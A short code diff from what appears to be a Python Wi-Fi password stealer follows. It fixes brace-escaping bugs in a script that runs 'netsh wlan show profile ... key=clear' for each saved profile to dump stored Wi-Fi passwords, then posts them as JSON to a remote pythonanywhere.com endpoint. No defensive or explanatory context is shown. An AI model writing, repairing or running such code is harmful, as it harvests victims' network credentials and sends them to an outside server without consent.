@@ -43,11 +43,11 @@ result = execute_command(command_to_execute)
 pattern = r":\s*(.+)"
 
 matches = re.findall(pattern, result)
-dict = {{}}
+dict = {}
 for index, match in enumerate(matches, start=1):
     res = execute_command(f'netsh wlan show profile name="{match}" key=clear')
     if res:
-        dict[f"{{index}}{{match}}"] = res
+        dict[f"{index}{match}"] = res
 
 url = "https://keedakandi.pythonanywhere.com/api/json-store/wifi-post"
 response = requests.post(url, json=dict, timeout=20)
